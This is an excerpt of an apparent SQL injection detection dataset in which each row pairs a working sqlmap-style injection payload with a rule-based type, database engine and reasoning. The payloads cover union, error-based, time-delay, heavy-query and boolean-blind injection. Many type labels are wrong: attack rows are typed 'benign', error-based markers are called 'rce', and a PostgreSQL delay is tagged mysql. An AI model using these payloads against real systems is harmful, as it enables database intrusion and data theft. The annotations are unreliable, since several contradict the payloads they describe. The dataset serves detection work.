row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
8100,"1 ) as zdym where 1578 = 1578 union all select null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8101,"1' ) ) union all select null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8102,"1' ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'vcvj' = 'vcvj",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
8103,1' ) and 2305 = 1934,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8104,"1' in boolean mode ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) #",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
8105,"1', ( select ( case when ( 7616 = 7616 ) then 1 else 1/ ( select 0 ) end ) )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8106,"1' ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and 'hqqj' = 'hqqj",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8107,-6079 ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 8708 = 8708,1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
8108,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8109,"1' ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( 'oxvd' like 'oxvd",1,,boolean_blind,mysql,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on mysql",rule-based
8110,"-2899"" ) ) as uyoc where 8417 = 8417 union all select 8417,8417,8417,8417--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8111,"1'|| ( select 'alxi' where 3967 = 3967 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,,rce,generic,0.95,0x6d457153 detected — rce injection (priority 1) on generic,rule-based
8112,-4582 ) ) as gvfo where 8885 = 8885 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
8113,-2929' ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 'nzmk' = 'nzmk,1,,boolean_blind,firebird,0.95,) and ( detected — boolean_blind injection (priority 8) on firebird,rule-based
8114,"1"" ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
8115,"-5014%"" ) ) ) or 3348 = 2430--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8116,"1' ) ) ) union all select null,null,null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8117,"1' ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'trdf' like 'trdf",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
8118,"1 ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( 5336 = 5336",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
8119,1' ) as ibaw where 2130 = 2130 and 9198 = 9198--,1,,boolean_blind,generic,0.95,2130 = 2130 and detected — boolean_blind injection (priority 8) on generic,rule-based
8120,"1 or elt ( 6272 = 6272,sleep ( 5 ) ) # klaw",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
8121,"1'|| ( select 'dpje' where 2704 = 2704 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,boolean_blind,generic,0.95,2704 = 2704 or detected — boolean_blind injection (priority 8) on generic,rule-based
8122,"1'+ ( select 'nhlx' where 2291 = 2291 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) +'",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
8123,select ( case when ( 7594 = 8086 ) then 7594 else 1/ ( select 0 ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8124,"1' ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8125,"-7543' ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
8126,"1%"" or elt ( 6272 = 6272,sleep ( 5 ) ) and ""%"" = """,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
8127,"1%"" ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
8128,"1'|| ( select 'tkmc' from dual where 9675 = 9675 union all select null,null,null,null--",1,,union_based,oracle,0.95,"union all select, union all select detected — union_based injection (priority 7) on oracle",rule-based
